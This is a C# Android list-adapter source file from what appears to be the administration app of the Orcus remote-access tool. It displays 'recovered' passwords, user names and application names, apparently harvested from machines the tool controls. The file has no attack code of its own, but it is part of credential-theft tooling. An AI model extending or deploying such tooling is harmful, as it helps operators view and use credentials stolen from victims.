using System;
using Android.Widget;
using Orcus.Shared.Commands.Password;
using Android.App;
using System.Collections.Generic;

namespace Orcus.Administration.App
{
	public class PasswordsListAdapter : ArrayAdapter<RecoveredPassword>
	{
		Activity context;

		public PasswordsListAdapter (Activity context, List<RecoveredPassword> passwords)
			: base(context, Android.Resource.Id.Text1, passwords)
		{
			this.context = context;
			NotifyDataSetChanged ();
			Passwords = passwords;
		}

		public List<RecoveredPassword> Passwords {
			get;
			set;
		}

		public void Change(List<RecoveredPassword> passwords){

			this.Clear ();
			foreach (var password in passwords) {
				Add (password);
			}

			Passwords = passwords;
		}

		public override Android.Views.View GetView (int position, Android.Views.View convertView, Android.Views.ViewGroup parent)
		{
			var view = context.LayoutInflater.Inflate(Resource.Layout.PasswordRow, null);

			var item = GetItem(position);

			var passwordText = view.FindViewById<TextView> (Resource.Id.passwordText);
			passwordText.Text = string.IsNullOrEmpty(item.Password) ? "/" : item.Password;

			var userNameText = view.FindViewById<TextView> (Resource.Id.userNameText);
			userNameText.Text = item.UserName;

			var applicationText = view.FindViewById<TextView> (Resource.Id.applicationText);
			applicationText.Text = item.Application;

			var field1Text = view.FindViewById<TextView> (Resource.Id.field1Text);
			field1Text.Text = string.IsNullOrEmpty(item.Field1) ? "/" : item.Field1;

			var field2Text = view.FindViewById<TextView> (Resource.Id.field2Text);
			field2Text.Text = string.IsNullOrEmpty(item.Field2) ? "/" : item.Field2;

			return view;
		}
	}
}